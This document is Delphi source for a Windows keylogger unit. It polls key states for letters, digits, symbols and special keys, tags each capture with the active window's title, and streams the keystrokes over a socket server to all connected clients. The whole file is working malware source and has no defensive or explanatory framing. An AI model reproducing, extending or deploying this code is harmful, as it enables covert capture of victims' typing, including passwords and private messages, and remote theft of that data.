unit Unit2;

interface

uses SysUtils, Windows;

procedure GetLetter;
function Shift:Boolean;
function MoreChars(CharNumber:Integer;TruePart,FalsePart:string;var Answer:string):Boolean;
procedure ShowLetter(strLetter:string);
function ActiveCaption:string;

implementation

uses unit1;

var
   cWindow:string;

procedure GetLetter;
var
   j:Integer;
   a:string;
begin
   //Verify if lettrers 'A'..'Z' is pressed
   for j:=65 to 90 do
      if Odd(GetAsyncKeyState(j)) then
         ShowLetter(Chr(j));
   //Verify if numpab is pressed
   for j:=96 to 105 do
      if Odd(GetAsyncKeyState(j)) then
         ShowLetter(IntToStr((j - 97) + 1));
   //Verify if F1 to F24 is pressed
   for j:=112 to 135 do
      if Odd(GetAsyncKeyState(j)) then
         ShowLetter('{F' + IntToStr(j - 112 + 1) + '}');
   //Verify if number 0 to 9 is pressed
   for j:=48 to 57 do
      if Odd(GetAsyncKeyState(j)) then
         if Shift then
         begin
            case j - 48 of
               1: ShowLetter('!');
               2: ShowLetter('@');
               3: ShowLetter('#');
               4: ShowLetter('$');
               5: ShowLetter('%');
               6: ShowLetter('^');
               7: ShowLetter('&');
               8: ShowLetter('*');
               9: ShowLetter('(');
               0: ShowLetter(')');
            end;
         end
         else
            ShowLetter(IntToStr(j - 48));
   if Odd(GetAsyncKeyState(VK_BACK)) then ShowLetter('<Back>');
   if Odd(GetAsyncKeyState(VK_TAB)) then ShowLetter('<Tab>');
   if Odd(GetAsyncKeyState(VK_RETURN)) then ShowLetter(#13#10);
   if Odd(GetAsyncKeyState(VK_SHIFT)) then ShowLetter('<Shift>');
   if Odd(GetAsyncKeyState(VK_CONTROL)) then ShowLetter('<CTRL>');
   if Odd(GetAsyncKeyState(VK_MENU)) then ShowLetter('<Alt>');
   if Odd(GetAsyncKeyState(VK_PAUSE)) then ShowLetter('<Pause>');
   if Odd(GetAsyncKeyState(VK_ESCAPE)) then ShowLetter('<ESC>');
   if Odd(GetAsyncKeyState(VK_SPACE)) then ShowLetter(' ');
   if Odd(GetAsyncKeyState(VK_END)) then ShowLetter('<End>');
   if Odd(GetAsyncKeyState(VK_HOME)) then ShowLetter('<Home>');
   if Odd(GetAsyncKeyState(VK_LEFT)) then ShowLetter('<Left>');
   if Odd(GetAsyncKeyState(VK_RIGHT)) then ShowLetter('<Right>');
   if Odd(GetAsyncKeyState(VK_UP)) then ShowLetter('<Up>');
   if Odd(GetAsyncKeyState(VK_DOWN)) then ShowLetter('<Down>');
   if Odd(GetAsyncKeyState(VK_INSERT)) then ShowLetter('<Insert>');
   if Odd(GetAsyncKeyState(VK_MULTIPLY)) then ShowLetter('*');
   if Odd(GetAsyncKeyState(VK_ADD)) then ShowLetter('+');
   if Odd(GetAsyncKeyState(VK_SUBTRACT)) then ShowLetter('-');
   if Odd(GetAsyncKeyState(VK_DECIMAL)) then ShowLetter('.');
   if Odd(GetAsyncKeyState(VK_DIVIDE)) then ShowLetter('/');
   if Odd(GetAsyncKeyState(VK_NUMLOCK)) then ShowLetter('<Num>');
   if Odd(GetAsyncKeyState(VK_CAPITAL)) then ShowLetter('<C>');
   if Odd(GetAsyncKeyState(VK_SCROLL)) then ShowLetter('<S>');
   if Odd(GetAsyncKeyState(VK_DELETE)) then ShowLetter('<D>');
   if Odd(GetAsyncKeyState(VK_PRIOR)) then ShowLetter('<PU>');
   if Odd(GetAsyncKeyState(VK_NEXT)) then ShowLetter('<PD>');
   if Odd(GetAsyncKeyState(VK_PRINT)) then ShowLetter('<Print>');
   if MoreChars($BA,':',';',a) then ShowLetter(a);
   if MoreChars($BB,'+','=',a) then ShowLetter(a);
   if MoreChars($BC,'<',',',a) then ShowLetter(a);
   if MoreChars($BD,'_','-',a) then ShowLetter(a);
   if MoreChars($BE,'>','.',a) then ShowLetter(a);
   if MoreChars($BF,'?','/',a) then ShowLetter(a);
   if MoreChars($C0,'~','`',a) then ShowLetter(a);
   if MoreChars($DB,'{','[',a) then ShowLetter(a);
   if MoreChars($DC,'|','\',a) then ShowLetter(a);
   if MoreChars($DD,'}',']',a) then ShowLetter(a);
   if MoreChars($DE,'"','''',a) then ShowLetter(a);
   {PrintScreen}
end;

function MoreChars(CharNumber:Integer;TruePart,FalsePart:string;var Answer:string):Boolean;
begin
   MoreChars:=True;
   if Odd(GetAsyncKeyState(CharNumber)) then
   begin
      if Shift then
         Answer:=TruePart
      else
         Answer:=FalsePart;
      Exit;
   end;
   MoreChars:=False;
end;

function Shift:Boolean;
begin
   Shift:=GetAsyncKeyState(VK_SHIFT) <> 0;
end;

procedure ShowLetter(strLetter:string);
var
   k,t:Integer;
   cActive:string;
begin
   t:=Form1.ServerLogger.Socket.ActiveConnections;
   if t <= 0 then
   begin
      Form1.TmrLogger.Enabled:=False;
      Exit;
   end;
   cActive:=ActiveCaption;
   if cWindow <> cActive then
   begin
      cWindow:=cActive;
      strLetter:=#13#10 + '[' + cWindow + ']' + #13#10 + strLetter;
   end;
   for k:=0 to t - 1 do
      try
         Form1.ServerLogger.Socket.Connections[k].SendText(strLetter);
      except
      end;
end;

function ActiveCaption:string;
var
   Handle:THandle;
   Len:LongInt;
   Title:string;
begin
   Handle:=GetForegroundWindow;
   Len:=GetWindowTextLength(Handle) + 1;
   SetLength(Title,Len);
   GetWindowText(Handle,PChar(Title),Len);
   ActiveCaption:=TrimRight(Title);
end;


end.
 